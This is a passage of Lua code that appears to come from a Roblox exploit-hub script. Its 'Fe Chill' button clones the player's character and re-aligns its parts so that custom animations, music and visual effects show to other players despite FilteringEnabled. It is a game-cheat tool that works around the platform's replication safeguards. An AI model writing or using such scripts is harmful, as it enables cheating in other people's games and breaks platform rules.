function onFallingDown()
pose = "FallingDown"
end

function onSeated()
pose = "Seated"
end

function onPlatformStanding()
pose = "PlatformStanding"
end

function onSwimming(speed)
if speed>0 then
 pose = "Running"
else
 pose = "Standing"
end
end

function moveJump()
RightShoulder.MaxVelocity = jumpMaxLimbVelocity
LeftShoulder.MaxVelocity = jumpMaxLimbVelocity
 RightShoulder:SetDesiredAngle(3.14)
LeftShoulder:SetDesiredAngle(-3.14)
RightHip:SetDesiredAngle(0)
LeftHip:SetDesiredAngle(0)
end


-- same as jump for now

function moveFreeFall()
RightShoulder.MaxVelocity = jumpMaxLimbVelocity
LeftShoulder.MaxVelocity = jumpMaxLimbVelocity
RightShoulder:SetDesiredAngle(3.14)
LeftShoulder:SetDesiredAngle(-3.14)
RightHip:SetDesiredAngle(0)
LeftHip:SetDesiredAngle(0)
end

function moveSit()
RightShoulder.MaxVelocity = 0.15
LeftShoulder.MaxVelocity = 0.15
RightShoulder:SetDesiredAngle(3.14 /2)
LeftShoulder:SetDesiredAngle(-3.14 /2)
RightHip:SetDesiredAngle(3.14 /2)
LeftHip:SetDesiredAngle(-3.14 /2)
end

function getTool()
for _, kid in ipairs(Figure:GetChildren()) do
 if kid.className == "Tool" then return kid end
end
return nil
end

function getToolAnim(tool)
for _, c in ipairs(tool:GetChildren()) do
 if c.Name == "toolanim" and c.className == "StringValue" then
  return c
 end
end
return nil
end

function animateTool()

if (toolAnim == "None") then
 RightShoulder:SetDesiredAngle(1.57)
 return
end

if (toolAnim == "Slash") then
 RightShoulder.MaxVelocity = 0.5
 RightShoulder:SetDesiredAngle(0)
 return
end

if (toolAnim == "Lunge") then
 RightShoulder.MaxVelocity = 0.5
 LeftShoulder.MaxVelocity = 0.5
 RightHip.MaxVelocity = 0.5
 LeftHip.MaxVelocity = 0.5
 RightShoulder:SetDesiredAngle(1.57)
 LeftShoulder:SetDesiredAngle(1.0)
 RightHip:SetDesiredAngle(1.57)
 LeftHip:SetDesiredAngle(1.0)
 return
end
end

function move(time)
local amplitude
local frequency
 
if (pose == "Jumping") then
 moveJump()
 return
end

if (pose == "FreeFall") then
 moveFreeFall()
 return
end

if (pose == "Seated") then
 moveSit()
 return
end

local climbFudge = 0

if (pose == "Running") then
   if (RightShoulder.CurrentAngle > 1.5 or RightShoulder.CurrentAngle < -1.5) then
  RightShoulder.MaxVelocity = jumpMaxLimbVelocity
 else  
  RightShoulder.MaxVelocity = 0.15
 end
 if (LeftShoulder.CurrentAngle > 1.5 or LeftShoulder.CurrentAngle < -1.5) then
  LeftShoulder.MaxVelocity = jumpMaxLimbVelocity
 else  
  LeftShoulder.MaxVelocity = 0.15
 end
 amplitude = 1
 frequency = 9
elseif (pose == "Climbing") then
 RightShoulder.MaxVelocity = 0.5
 LeftShoulder.MaxVelocity = 0.5
 amplitude = 1
 frequency = 9
 climbFudge = 3.14
else
 amplitude = 0.1
 frequency = 1
end

desiredAngle = amplitude * math.sin(time*frequency)

RightShoulder:SetDesiredAngle(desiredAngle + climbFudge)
LeftShoulder:SetDesiredAngle(desiredAngle - climbFudge)
RightHip:SetDesiredAngle(-desiredAngle)
LeftHip:SetDesiredAngle(-desiredAngle)


local tool = getTool()

if tool then

 animStringValueObject = getToolAnim(tool)

 if animStringValueObject then
  toolAnim = animStringValueObject.Value
  -- message recieved, delete StringValue
  animStringValueObject.Parent = nil
  toolAnimTime = time + .3
 end

 if time > toolAnimTime then
  toolAnimTime = 0
  toolAnim = "None"
 end

 animateTool()

 
else
 toolAnim = "None"
 toolAnimTime = 0
end
end


-- connect events

Humanoid.Died:connect(onDied)
Humanoid.Running:connect(onRunning)
Humanoid.Jumping:connect(onJumping)
Humanoid.Climbing:connect(onClimbing)
Humanoid.GettingUp:connect(onGettingUp)
Humanoid.FreeFalling:connect(onFreeFall)
Humanoid.FallingDown:connect(onFallingDown)
Humanoid.Seated:connect(onSeated)
Humanoid.PlatformStanding:connect(onPlatformStanding)
Humanoid.Swimming:connect(onSwimming)
-- main program

local runService = game:service("RunService");

while Figure.Parent~=nil do
local _, time = wait(0.1)
move(time)
end
end)


Section:NewButton("Fe Chill", "Chill Dude lol", function()
game:GetService("StarterGui"):SetCore("SendNotification", { 

	Title = "Melon's (FE) Scripts";

	Text = "Loading, enjoy!";

	Icon = "rbxthumb://type=Asset&id=7969699183&w=150&h=150"})

Duration = 16;

wait(0)

HumanDied = false

local CountSCIFIMOVIELOL = 1

function SCIFIMOVIELOL(Part0,Part1,Position,Angle)

	local AlignPos = Instance.new('AlignPosition', Part1); AlignPos.Name = "AliP_"..CountSCIFIMOVIELOL

	AlignPos.ApplyAtCenterOfMass = true;

	AlignPos.MaxForce = 5772000--67752;

	AlignPos.MaxVelocity = math.huge/9e110;

	AlignPos.ReactionForceEnabled = false;

	AlignPos.Responsiveness = 200;

	AlignPos.RigidityEnabled = false;

	local AlignOri = Instance.new('AlignOrientation', Part1); AlignOri.Name = "AliO_"..CountSCIFIMOVIELOL

	AlignOri.MaxAngularVelocity = math.huge/9e110;

	AlignOri.MaxTorque = 5772000

	AlignOri.PrimaryAxisOnly = false;

	AlignOri.ReactionTorqueEnabled = false;

	AlignOri.Responsiveness = 200;

	AlignOri.RigidityEnabled = false;

	local AttachmentA=Instance.new('Attachment',Part1); AttachmentA.Name = "Ath_"..CountSCIFIMOVIELOL

	local AttachmentB=Instance.new('Attachment',Part0); AttachmentB.Name = "Ath_"..CountSCIFIMOVIELOL

	AttachmentA.Orientation = Angle or Vector3.new(0,0,0)

	AttachmentA.Position = Position or Vector3.new(0,0,0)

	AlignPos.Attachment1 = AttachmentA;

	AlignPos.Attachment0 = AttachmentB;

	AlignOri.Attachment1 = AttachmentA;

	AlignOri.Attachment0 = AttachmentB;

	CountSCIFIMOVIELOL = CountSCIFIMOVIELOL + 1

	return {AlignPos,AlignOri,AttachmentA,AttachmentB}

end



game:FindFirstChildOfClass("Players").LocalPlayer["Character"].Archivable = true

local hatnameclone = {}

for _,v in next, game:FindFirstChildOfClass("Players").LocalPlayer["Character"]:GetChildren() do

	if v:IsA("Accessory") then

		if hatnameclone[v.Name] then

			if hatnameclone[v.Name] == "s" then

				hatnameclone[v.Name] = {}

			end

			table.insert(hatnameclone[v.Name],v)

		else

			hatnameclone[v.Name] = "s"

		end

	end

end

for _,v in pairs(hatnameclone) do

	if type(v) == "table" then

		local num = 1

		for _,w in pairs(v) do

			w.Name = w.Name..num

			num = num + 1

		end

	end

end

hatnameclone = nil



local DeadChar = game:FindFirstChildOfClass("Players").LocalPlayer.Character



local fldr = Instance.new("Folder",game:FindFirstChildOfClass("Players").LocalPlayer["Character"])

fldr.Name = "DMYF"

local CloneChar = DeadChar:Clone()

local ANIMATIONHERE

if CloneChar:FindFirstChild("Animate") then

	ANIMATIONHERE = CloneChar:FindFirstChild("Animate"):Clone()

	CloneChar:FindFirstChild("Animate"):Destroy()

end

if CloneChar:FindFirstChildOfClass("Folder") then CloneChar:FindFirstChildOfClass("Folder"):Destroy() end

if CloneChar.Torso:FindFirstChild("Neck") then

	local Clonessss = CloneChar.Torso:FindFirstChild("Neck"):Clone()

	Clonessss.Part0 = nil

	Clonessss.Part1 = DeadChar.Head

	Clonessss.Parent = DeadChar.Torso

end

CloneChar.Parent = fldr

CloneChar.HumanoidRootPart.CFrame = DeadChar.HumanoidRootPart.CFrame

CloneChar.Humanoid.BreakJointsOnDeath = false

CloneChar.Name = "non"

CloneChar.Humanoid.DisplayDistanceType = "None"



for _,v in next, DeadChar:GetChildren() do

	if v:IsA("Accessory") then

		local topacc = false

		if v.Handle:FindFirstChildOfClass("Weld") then v.Handle:FindFirstChildOfClass("Weld"):Destroy() end

		v.Handle.Massless = true

		v.Handle.CanCollide = false

		if v.Handle:FindFirstChildOfClass("Attachment") then

			local ath__ = v.Handle:FindFirstChildOfClass("Attachment")

			if ath__.Name == "HatAttachment" or ath__.Name == "HairAttachment" or ath__.Name == "FaceFrontAttachment" or ath__.Name == "FaceCenterAttachment" then

				topacc = ath__.Name

			end

		end

        local bv = Instance.new("BodyVelocity",v.Handle)

		bv.Velocity = Vector3.new(0,0,0)

		coroutine.wrap(function()

			if topacc then

				local allthings = SCIFIMOVIELOL(v.Handle,DeadChar.Torso,Vector3.new(0,1.5,0)+ (DeadChar.Head[topacc].Position + (v.Handle[topacc].Position*-1)),Vector3.new(0,0,0))

				local normaltop = allthings[1].Attachment1

				local alipos = allthings[1]

				local alirot = allthings[2]

				local p0 = v.Handle

				local p1 = DeadChar.Head

				alipos.Parent = CloneChar:FindFirstChild(v.Name).Handle

				alirot.Parent = CloneChar:FindFirstChild(v.Name).Handle

				while true do

					game:GetService("RunService").RenderStepped:wait()

					if HumanDied then break end

					coroutine.wrap(function()

						if alipos.Attachment1 == normaltop then

							p0.CFrame = p0.CFrame:lerp((((DeadChar.Torso.CFrame * CFrame.new(0,1.5,0)) * p1[topacc].CFrame) * p0[topacc].CFrame:inverse()),1)

						else

							v.Handle.CFrame = v.Handle.CFrame:lerp(alipos.Attachment1.Parent.CFrame * CFrame.new(alipos.Attachment1.Position) * CFrame.Angles(math.rad(alipos.Attachment1.Rotation.X),math.rad(alipos.Attachment1.Rotation.Y),math.rad(alipos.Attachment1.Rotation.Z)),1)

						end

					end)()

				end

			else

				SCIFIMOVIELOL(v.Handle,CloneChar[v.Name].Handle,Vector3.new(0,0,0),Vector3.new(0,0,0))

			end

		end)()

    end

end



local a = DeadChar.Torso

local b = DeadChar.HumanoidRootPart

local c = DeadChar.Humanoid

a.Parent = game:FindFirstChildOfClass("Workspace")

c.Parent = game:FindFirstChildOfClass("Workspace")

local told = a:Clone()

local told1 = c:Clone()

b["RootJoint"].Part0 = told

b["RootJoint"].Part1 = DeadChar.Head

a.Name = "torso"

a.Neck:Destroy()

c.Name = "Mizt Hub Best"

told.Parent = DeadChar

told1.Parent = DeadChar

DeadChar.PrimaryPart = told

told1.Health = 0

b:Destroy()

a.Parent = DeadChar

c.Parent = DeadChar

told:Destroy()

told1:Destroy()

a.Name = "Torso"



if CloneChar.Head:FindFirstChildOfClass("Decal") then CloneChar.Head:FindFirstChildOfClass("Decal").Transparency = 1 end

if DeadChar:FindFirstChild("Animate") then DeadChar:FindFirstChild("Animate"):Destroy() end



local Collider

function UnCollide()

    if HumanDied then Collider:Disconnect(); return end

    --[[for _,Parts in next, CloneChar:GetChildren() do

        if Parts:IsA("BasePart") then

            Parts.CanCollide = false 

        end 

    end]]

    for _,Parts in next, DeadChar:GetChildren() do

        if Parts:IsA("BasePart") then

        Parts.CanCollide = false

        end 

    end 

end

Collider = game:GetService("RunService").Stepped:Connect(UnCollide)



local resetBindable = Instance.new("BindableEvent")

resetBindable.Event:connect(function()

    game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)

	resetBindable:Destroy()

	HumanDied = true

    pcall(function()

		game:FindFirstChildOfClass("Players").LocalPlayer.Character = DeadChar

		DeadChar.Head:Destroy()

		DeadChar:FindFirstChildOfClass("Humanoid"):Destroy()

		game:FindFirstChildOfClass("Players").LocalPlayer.Character = CloneChar

		if DeadChar:FindFirstChildOfClass("Folder") then DeadChar:FindFirstChildOfClass("Folder"):Destroy() end

	end)

end)

game:GetService("StarterGui"):SetCore("ResetButtonCallback", resetBindable)



coroutine.wrap(function()

    while true do

        game:GetService("RunService").RenderStepped:wait()

        if not CloneChar or not CloneChar:FindFirstChild("Head") or not CloneChar:FindFirstChildOfClass("Humanoid") or CloneChar:FindFirstChildOfClass("Humanoid").Health <= 0 and not DeadChar or not DeadChar:FindFirstChild("Head") or not DeadChar:FindFirstChildOfClass("Humanoid") or DeadChar:FindFirstChildOfClass("Humanoid").Health <= 0 then 

            HumanDied = true

            pcall(function()

				game:FindFirstChildOfClass("Players").LocalPlayer.Character = DeadChar

				DeadChar.Head:Destroy()

				DeadChar:FindFirstChildOfClass("Humanoid"):Destroy()

				game:FindFirstChildOfClass("Players").LocalPlayer.Character = CloneChar

				if DeadChar:FindFirstChildOfClass("Folder") then DeadChar:FindFirstChildOfClass("Folder"):Destroy() end

			end)

            if resetBindable then

                game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)

                resetBindable:Destroy()

            end

            break

        end		

    end

end)()





SCIFIMOVIELOL(DeadChar["Head"],CloneChar["Head"])

SCIFIMOVIELOL(DeadChar["Torso"],CloneChar["Torso"])

SCIFIMOVIELOL(DeadChar["Left Arm"],CloneChar["Left Arm"])

SCIFIMOVIELOL(DeadChar["Right Arm"],CloneChar["Right Arm"])

SCIFIMOVIELOL(DeadChar["Left Leg"],CloneChar["Left Leg"])

SCIFIMOVIELOL(DeadChar["Right Leg"],CloneChar["Right Leg"])



for _,v in pairs(DeadChar:GetChildren()) do

	if v:IsA("BasePart") and v.Name ~= "Head" then

		--[[local bv = Instance.new("BodyVelocity",v)

		bv.Velocity = Vector3.new(0,0,0)

		coroutine.wrap(function()

			while true do

				game:GetService("RunService").RenderStepped:wait()

				if HumanDied then break end

				v.CFrame = CloneChar[v.Name].CFrame

			end

		end)()]]

	elseif v:IsA("BasePart") and v.Name == "Head" then

		local bv = Instance.new("BodyVelocity",v)

		bv.Velocity = Vector3.new(0,0,0)

		coroutine.wrap(function()

			while true do

				game:GetService("RunService").RenderStepped:wait()

				if HumanDied then break end

				v.CFrame = DeadChar.Torso.CFrame * CFrame.new(0,1.5,0)

			end

		end)()

	end

end



for _,BodyParts in next, CloneChar:GetDescendants() do

if BodyParts:IsA("BasePart") or BodyParts:IsA("Part") then

BodyParts.Transparency = 1 end end

game:GetService("RunService").RenderStepped:wait()

game:FindFirstChildOfClass("Players").LocalPlayer.Character = CloneChar

game:FindFirstChildOfClass("Workspace"):FindFirstChildOfClass("Camera").CameraSubject = CloneChar.Humanoid



for _,v in next, DeadChar:GetChildren() do

	if v:IsA("Accessory") then

		if v.Handle:FindFirstChildOfClass("Weld") then v.Handle:FindFirstChildOfClass("Weld"):Destroy() end

	end

end



if ANIMATIONHERE then ANIMATIONHERE.Parent = CloneChar end



wait(0)



m = game.Players.LocalPlayer

char = m.Character



function Random(num)

    local section=num % 1 * 3;

    local secondary=0.5 * math.pi * (section % 1);

    if section < 1 then

        return 1,1 - math.cos(secondary),1 - math.sin(secondary);

    elseif section < 2 then

        return 1 - math.sin(secondary),1,1 - math.cos(secondary);

    else

        return 1 - math.cos(secondary),1 - math.sin(secondary),1;

    end

end



--//Lol try to figure this one out//

function rainb(hue)

    local section = hue % 1 * 3

    local secondary = 0.5 * math.pi * (section % 1)

    if section < 1 then

        return Color3.new(1, 1 - math.cos(secondary), 1 - math.sin(secondary))

    elseif section < 2 then

        return Color3.new(1 - math.sin(secondary), 1, 1 - math.cos(secondary))

    else

        return Color3.new(1 - math.cos(secondary), 1 - math.sin(secondary), 1)

    end

end



Chillmusic = Instance.new("Sound", workspace)

Chillmusic.Parent = game.Chat

Chillmusic.Volume = 8

Chillmusic.SoundId = "rbxassetid://1221694420"

Chillmusic.Looped = true

Chillmusic:Play()



local txt = Instance.new("BillboardGui", char)

txt.Adornee = char.Head

txt.Name = "_status"

txt.Size = UDim2.new(2, 0, 1.2, 0)

txt.StudsOffset = Vector3.new(-9, 8, 0)

local text = Instance.new("TextLabel", txt)

text.Size = UDim2.new(10, 0, 7, 0)

text.FontSize = "Size24"

text.TextScaled = true

text.TextTransparency = 0

text.BackgroundTransparency = 1

text.TextTransparency = 0

text.TextStrokeTransparency = 0

text.Font = "Arcade"

text.TextStrokeColor3 = Color3.new(0, 0, 0)

v = Instance.new("Part")

v.Name = "ColorBrick"

v.Parent = m.Character

v.FormFactor = "Symmetric"

v.Anchored = true

v.CanCollide = false

v.BottomSurface = "Smooth"

v.TopSurface = "Smooth"

v.Size = Vector3.new(10, 5, 3)

v.Transparency = 1

v.CFrame = char.Torso.CFrame

v.BrickColor = BrickColor.new("Really black")

v.Transparency = 1

spawn(function()

TweenService = game:GetService("TweenService")

Colours = {Color3.fromRGB(0,100,200),Color3.fromRGB(4, 175, 236)}

Int = 0

while wait(2) do

    if Int == #Colours then Int = 0 end

    Int = Int+1

    TweenService:Create(text,TweenInfo.new(1),{TextColor3 = Colours[Int]}):Play()

end

end)

v.Shape = "Block"

text.Text = "~»Chill Af«~"

Player = game:GetService("Players").LocalPlayer

Character = Player.Character

PlayerGui = Player.PlayerGui

Backpack = Player.Backpack

Torso = Character.Torso

Head = Character.Head

Humanoid = Character.Humanoid

m = Instance.new("Model", Character)

LeftArm = Character["Left Arm"]

LeftLeg = Character["Left Leg"]

RightArm = Character["Right Arm"]

RightLeg = Character["Right Leg"]

LS = Torso["Left Shoulder"]

LH = Torso["Left Hip"]

RS = Torso["Right Shoulder"]

RH = Torso["Right Hip"]

Face = Head.face

Neck = Torso.Neck

it = Instance.new

attacktype = 1

vt = Vector3.new

cf = CFrame.new

bc = BrickColor.new

br = BrickColor.random

it = Instance.new

euler = CFrame.fromEulerAnglesXYZ

angles = CFrame.Angles

cloaked = false

necko = cf(0, 1, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0)
necko2 = cf(0, -0.5, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0)
LHC0 = cf(-1, -1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
LHC1 = cf(-0.5, 1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
RHC0 = cf(1, -1, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
RHC1 = cf(0.5, 1, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
RootPart = Character.HumanoidRootPart
RootJoint = RootPart.RootJoint
RootCF = euler(-1.57, 0, 3.14)
attack = false
attackdebounce = false
equipped = false
trispeed = 0.2
attackmode = "none"
local idle = 0
local Anim = "Idle"
Head.face.Texture = "rbxassetid://206844132"



local Trail = Instance.new("Trail",char)

local attachment0 = Instance.new("Attachment",char["Right Arm"])

attachment0.Name = "TrailAttachment0"

attachment0.CFrame = CFrame.new(-0.25,-1,0)

local attachment1 = Instance.new("Attachment",char["Right Arm"])

attachment1.CFrame = CFrame.new(0.25,-1,0)

attachment1.Name = "TrailAttachment1"

Trail.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(1,1)})

Trail.Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.new(1,0,0)),ColorSequenceKeypoint.new(0.2,Color3.new(1,1,0)),ColorSequenceKeypoint.new(0.4,Color3.new(0,1,0)),ColorSequenceKeypoint.new(0.6,Color3.new(0,1,1)),ColorSequenceKeypoint.new(0.8,Color3.new(0,0,1)),ColorSequenceKeypoint.new(1,Color3.new(0,0,1))})

Trail.Lifetime = 0.5

Trail.Attachment0 = attachment0

Trail.Attachment1 = attachment1



local Trail = Instance.new("Trail",char)

local attachment0 = Instance.new("Attachment",char["Left Arm"])

attachment0.Name = "TrailAttachment0"

attachment0.CFrame = CFrame.new(-0.25,-1,0)

local attachment1 = Instance.new("Attachment",char["Left Arm"])

attachment1.CFrame = CFrame.new(0.25,-1,0)

attachment1.Name = "TrailAttachment1"

Trail.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(1,1)})

Trail.Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.new(1,0,0)),ColorSequenceKeypoint.new(0.2,Color3.new(1,1,0)),ColorSequenceKeypoint.new(0.4,Color3.new(0,1,0)),ColorSequenceKeypoint.new(0.6,Color3.new(0,1,1)),ColorSequenceKeypoint.new(0.8,Color3.new(0,0,1)),ColorSequenceKeypoint.new(1,Color3.new(0,0,1))})

Trail.Lifetime = 0.5

Trail.Attachment0 = attachment0

Trail.Attachment1 = attachment1



local Trail = Instance.new("Trail",char)

local attachment0 = Instance.new("Attachment",char["Right Leg"])

attachment0.Name = "TrailAttachment0"

attachment0.CFrame = CFrame.new(-0.25,-1,0)

local attachment1 = Instance.new("Attachment",char["Right Leg"])

attachment1.CFrame = CFrame.new(0.25,-1,0)

attachment1.Name = "TrailAttachment1"

Trail.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(1,1)})

Trail.Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.new(1,0,0)),ColorSequenceKeypoint.new(0.2,Color3.new(1,1,0)),ColorSequenceKeypoint.new(0.4,Color3.new(0,1,0)),ColorSequenceKeypoint.new(0.6,Color3.new(0,1,1)),ColorSequenceKeypoint.new(0.8,Color3.new(0,0,1)),ColorSequenceKeypoint.new(1,Color3.new(0,0,1))})

Trail.Lifetime = 0.5

Trail.Attachment0 = attachment0

Trail.Attachment1 = attachment1



local Trail = Instance.new("Trail",char)

local attachment0 = Instance.new("Attachment",char["Left Leg"])

attachment0.Name = "TrailAttachment0"

attachment0.CFrame = CFrame.new(-0.25,-1,0)

local attachment1 = Instance.new("Attachment",char["Left Leg"])

attachment1.CFrame = CFrame.new(0.25,-1,0)

attachment1.Name = "TrailAttachment1"

Trail.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(1,1)})

Trail.Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.new(1,0,0)),ColorSequenceKeypoint.new(0.2,Color3.new(1,1,0)),ColorSequenceKeypoint.new(0.4,Color3.new(0,1,0)),ColorSequenceKeypoint.new(0.6,Color3.new(0,1,1)),ColorSequenceKeypoint.new(0.8,Color3.new(0,0,1)),ColorSequenceKeypoint.new(1,Color3.new(0,0,1))})

Trail.Lifetime = 0.5

Trail.Attachment0 = attachment0

Trail.Attachment1 = attachment1





Humanoid.Animator.Parent = nil

Character.Animate.Parent = nil

function FindNearestTorso(Position, Distance, SinglePlayer)

	if SinglePlayer then

		return Distance > (SinglePlayer.Torso.CFrame.p - Position).magnitude

	end

	local List = {}

	for i, v in pairs(workspace:GetChildren()) do

		if v:IsA("Model") and v:findFirstChild("Torso") and v ~= Character and Distance >= (v.Torso.Position - Position).magnitude then

			table.insert(List, v)

		end

	end

	return List

end

function lerp(a, b, t)

	return a + (b - a) * t

end

function slerp(a, b, t)

	dot = a:Dot(b)

	if dot > 0.99999 or dot < -0.99999 then

		return t <= 0.5 and a or b

	else

		r = math.acos(dot)

		return (a * math.sin((1 - t) * r) + b * math.sin(t * r)) / math.sin(r)

	end

end

function matrixInterpolate(a, b, t)

	local ax, ay, az, a00, a01, a02, a10, a11, a12, a20, a21, a22 = a:components()

	local bx, by, bz, b00, b01, b02, b10, b11, b12, b20, b21, b22 = b:components()

	local v0 = lerp(Vector3.new(ax, ay, az), Vector3.new(bx, by, bz), t)

	local v1 = slerp(Vector3.new(a00, a01, a02), Vector3.new(b00, b01, b02), t)

	local v2 = slerp(Vector3.new(a10, a11, a12), Vector3.new(b10, b11, b12), t)

	local v3 = slerp(Vector3.new(a20, a21, a22), Vector3.new(b20, b21, b22), t)

	local t = v1:Dot(v2)

	if not (t < 0) and t ~= 0 and not (t > 0) then

		return CFrame.new()

	end

	return CFrame.new(v0.x, v0.y, v0.z, v1.x, v1.y, v1.z, v2.x, v2.y, v2.z, v3.x, v3.y, v3.z)

end

function genWeld(a, b)

	local w = Instance.new("Weld", a)

	w.Part0 = a

	w.Part1 = b

	return w

end

function weld(a, b)

	local weld = Instance.new("Weld")

	weld.Name = "W"

	weld.Part0 = a

	weld.Part1 = b

	weld.C0 = a.CFrame:inverse() * b.CFrame

	weld.Parent = a

	return weld

end

function Lerp(c1, c2, al)

	local com1 = {

		c1.X,

		c1.Y,

		c1.Z,

		c1:toEulerAnglesXYZ()

	}

	local com2 = {

		c2.X,

		c2.Y,

		c2.Z,

		c2:toEulerAnglesXYZ()

	}

	for i, v in pairs(com1) do

		com1[i] = v + (com2[i] - v) * al

	end

	return CFrame.new(com1[1], com1[2], com1[3]) * CFrame.Angles(select(4, unpack(com1)))

end

function clerp(a, b, t)

	local qa = {

		QuaternionFromCFrame(a)

	}

	local qb = {

		QuaternionFromCFrame(b)

	}

	local ax, ay, az = a.x, a.y, a.z

	local bx, by, bz = b.x, b.y, b.z

	local _t = 1 - t

	return QuaternionToCFrame(_t * ax + t * bx, _t * ay + t * by, _t * az + t * bz, QuaternionSlerp(qa, qb, t))

end

function QuaternionFromCFrame(cf)

	local mx, my, mz, m00, m01, m02, m10, m11, m12, m20, m21, m22 = cf:components()

	local trace = m00 + m11 + m22

	if trace > 0 then

		local s = math.sqrt(1 + trace)

		local recip = 0.5 / s

		return (m21 - m12) * recip, (m02 - m20) * recip, (m10 - m01) * recip, s * 0.5

	else

		local i = 0

		if m00 < m11 then

			i = 1

		end

		if m22 > (i == 0 and m00 or m11) then

			i = 2

		end

		if i == 0 then

			local s = math.sqrt(m00 - m11 - m22 + 1)

			local recip = 0.5 / s

			return 0.5 * s, (m10 + m01) * recip, (m20 + m02) * recip, (m21 - m12) * recip

		elseif i == 1 then

			local s = math.sqrt(m11 - m22 - m00 + 1)

			local recip = 0.5 / s

			return (m01 + m10) * recip, 0.5 * s, (m21 + m12) * recip, (m02 - m20) * recip

		elseif i == 2 then

			local s = math.sqrt(m22 - m00 - m11 + 1)

			local recip = 0.5 / s

			return (m02 + m20) * recip, (m12 + m21) * recip, 0.5 * s, (m10 - m01) * recip

		end

	end

end

function QuaternionToCFrame(px, py, pz, x, y, z, w)

	local xs, ys, zs = x + x, y + y, z + z

	local wx, wy, wz = w * xs, w * ys, w * zs

	local xx = x * xs

	local xy = x * ys

	local xz = x * zs

	local yy = y * ys

	local yz = y * zs

	local zz = z * zs

	return CFrame.new(px, py, pz, 1 - (yy + zz), xy - wz, xz + wy, xy + wz, 1 - (xx + zz), yz - wx, xz - wy, yz + wx, 1 - (xx + yy))

end

function QuaternionSlerp(a, b, t)

	local cosTheta = a[1] * b[1] + a[2] * b[2] + a[3] * b[3] + a[4] * b[4]

	local startInterp, finishInterp

	if cosTheta >= 1.0E-4 then

		if 1 - cosTheta > 1.0E-4 then

			local theta = math.acos(cosTheta)

			local invSinTheta = 1 / math.sin(theta)

			startInterp = math.sin((1 - t) * theta) * invSinTheta

			finishInterp = math.sin(t * theta) * invSinTheta

		else

			startInterp = 1 - t

			finishInterp = t

		end

	elseif 1 + cosTheta > 1.0E-4 then

		local theta = math.acos(-cosTheta)

		local invSinTheta = 1 / math.sin(theta)

		startInterp = math.sin((t - 1) * theta) * invSinTheta

		finishInterp = math.sin(t * theta) * invSinTheta

	else

		startInterp = t - 1

		finishInterp = t

	end

	return a[1] * startInterp + b[1] * finishInterp, a[2] * startInterp + b[2] * finishInterp, a[3] * startInterp + b[3] * finishInterp, a[4] * startInterp + b[4] * finishInterp

end

function rayCast(Pos, Dir, Max, Ignore)

	return game:service("Workspace"):FindPartOnRay(Ray.new(Pos, Dir.unit * (Max or 999.999)), Ignore)

end

function part(formfactor, parent, reflectance, transparency, brickcolor, name, size)

	local fp = it("Part")

	fp.formFactor = formfactor

	fp.Parent = parent

	fp.Reflectance = reflectance

	fp.Transparency = transparency

	fp.CanCollide = false

	fp.Locked = true

	fp.BrickColor = brickcolor

	fp.Name = name

	fp.Size = size

	fp.Position = Torso.Position

	fp.BottomSurface = "Smooth"

	fp.TopSurface = "Smooth"

	fp:BreakJoints()

	return fp

end

function mesh(Mesh, part, meshtype, meshid, offset, scale)

	local mesh = it(Mesh)

	mesh.Parent = part

	if Mesh == "SpecialMesh" then

		mesh.MeshType = meshtype

		mesh.MeshId = meshid

	end

	mesh.Offset = offset

	mesh.Scale = scale

	return mesh

end

function weld(parent, part0, part1, c0)

	local weld = it("Weld")

	weld.Parent = parent

	weld.Part0 = part0

	weld.Part1 = part1

	weld.C0 = c0

	return weld

end

function rayCast(Pos, Dir, Max, Ignore)

	return game:service("Workspace"):FindPartOnRay(Ray.new(Pos, Dir.unit * (Max or 999.999)), Ignore)

end

RSH, LSH = nil, nil

RW, LW = Instance.new("Weld"), Instance.new("Weld")

RW.Name = "Right Shoulder"

LW.Name = "Left Shoulder"

LH = Torso["Left Hip"]

RH = Torso["Right Hip"]

TorsoColor = Torso.BrickColor

function NoOutline(Part)

	Part.TopSurface, Part.BottomSurface, Part.LeftSurface, Part.RightSurface, Part.FrontSurface, Part.BackSurface = 10, 10, 10, 10, 10, 10

end

player = Player

ch = Character

RSH = ch.Torso["Right Shoulder"]

LSH = ch.Torso["Left Shoulder"]

RSH.Parent = nil

LSH.Parent = nil

RW.Name = "Right Shoulder"

RW.Part0 = ch.Torso

RW.C0 = cf(1.5, 0.5, 0)

RW.C1 = cf(0, 0.5, 0)

RW.Part1 = ch["Right Arm"]

RW.Parent = ch.Torso

LW.Name = "Left Shoulder"

LW.Part0 = ch.Torso

LW.C0 = cf(-1.5, 0.5, 0)

LW.C1 = cf(0, 0.5, 0)

LW.Part1 = ch["Left Arm"]

LW.Parent = ch.Torso

function newWeld(wp0, wp1, wc0x, wc0y, wc0z)

	local wld = Instance.new("Weld", wp1)

	wld.Part0 = wp0

	wld.Part1 = wp1

	wld.C0 = CFrame.new(wc0x, wc0y, wc0z)

end

newWeld(RootPart, Torso, 0, -1, 0)

Torso.Weld.C1 = CFrame.new(0, -1, 0)

newWeld(Torso, LeftLeg, -0.5, -1, 0)

LeftLeg.Weld.C1 = CFrame.new(0, 1, 0)

newWeld(Torso, RightLeg, 0.5, -1, 0)

RightLeg.Weld.C1 = CFrame.new(0, 1, 0)

Player = game:GetService("Players").LocalPlayer

Character = Player.Character

mouse = Player:GetMouse()

m = Instance.new("Model", Character)

local weldBetween = function(a, b)

	local weldd = Instance.new("ManualWeld")

	weldd.Part0 = a

	weldd.Part1 = b

	weldd.C0 = CFrame.new()

	weldd.C1 = b.CFrame:inverse() * a.CFrame

	weldd.Parent = a

	return weldd

end

ArtificialHB = Instance.new("BindableEvent", script)

ArtificialHB.Name = "Heartbeat"

